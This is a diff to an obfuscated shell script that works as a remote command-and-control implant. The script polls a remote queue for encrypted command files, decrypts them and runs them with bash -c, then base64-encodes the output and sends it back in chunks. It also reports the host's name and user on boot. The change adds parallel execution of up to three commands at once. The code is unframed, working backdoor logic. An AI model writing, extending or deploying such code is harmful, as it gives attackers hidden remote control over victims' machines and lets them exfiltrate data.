@@ -40,7 +40,7 @@ _up() {
    _GOT=0
    _K=$_N
    while [ $_K -le $((_N+5)) ]; do
-     _NN=$(printf '%03d' $_K)
+     _NN=$(printf '%06d' $_K)
      _D=$($_C -s --max-time 12 "$_R1/queue/q$_NN.txt?$_BUST" 2>/dev/null)
      case "$_D" in
        U2FsdGVk*) printf '%s' "$_D" > "$_H/pend/.$_NN.w"; mv -f "$_H/pend/.$_NN.w" "$_H/pend/$_NN"; _K=$((_K+1)); _GOT=1 ;;
@@ -73,20 +73,34 @@ _up() {
  done
 ) &
 
-# ---------- executor loop (main) ----------
-_up "BOOT|$(hostname)|$(id -un)|$_CH|v2"
-while :; do
-  _F1=$(ls "$_H/pend" 2>/dev/null | sort | head -1)
-  if [ -z "$_F1" ]; then sleep $((20 + RANDOM % 10)); continue; fi
-  _FP="$_H/pend/$_F1"
-  _T=$(_dec "$_TK" "$(cat "$_FP")")
-  rm -f "$_FP"
-  [ -z "$_T" ] && { _up "ERR|decrypt|$_F1"; continue; }
+# ---------- executor loop (main) — parallel dispatch, max 3 concurrent ----------
+_up "BOOT|$(hostname)|$(id -un)|$_CH|v3"
+_job() {  # $1=slot $2=tag $3=payload
+  local _S="$1" _F1="$2" _PAY="$3"
+  local _T=$(_dec "$_TK" "$_PAY")
+  if [ -z "$_T" ]; then _up "ERR|decrypt|$_F1"; return; fi
   _log "exec $_F1"
-  _O=$(bash -c "$_T" 2>&1 | head -c 8000 | base64 -w0)
-  _R="${_O:-bm9uZQ==}"
+  local _O; _O=$(bash -c "$_T" 2>&1 | head -c 8000 | base64 -w0)
+  local _R="${_O:-bm9uZQ==}"
   printf '%s' "$_R" | fold -w1600 | while IFS= read -r _CH1 || [ -n "$_CH1" ]; do
     _up "RES|$_F1|$_CH1"
   done
   _log "done $_F1"
+}
+while :; do
+  _BUSY=0
+  for _S in 1 2 3; do
+    if [ -f "$_H/run/$_S.lock" ]; then
+      _JP=$(cat "$_H/run/$_S.lock" 2>/dev/null)
+      if [ -n "$_JP" ] && kill -0 "$_JP" 2>/dev/null; then _BUSY=1; continue; fi
+    fi
+    _F1=$(ls "$_H/pend" 2>/dev/null | sort | head -1)
+    [ -z "$_F1" ] && break
+    _PAY=$(cat "$_H/pend/$_F1" 2>/dev/null)
+    rm -f "$_H/pend/$_F1"
+    mkdir -p "$_H/run"
+    ( _job "$_S" "$_F1" "$_PAY"; rm -f "$_H/run/$_S.lock" ) &
+    echo $! > "$_H/run/$_S.lock"
+  done
+  sleep $((5 + RANDOM % 5))
 done
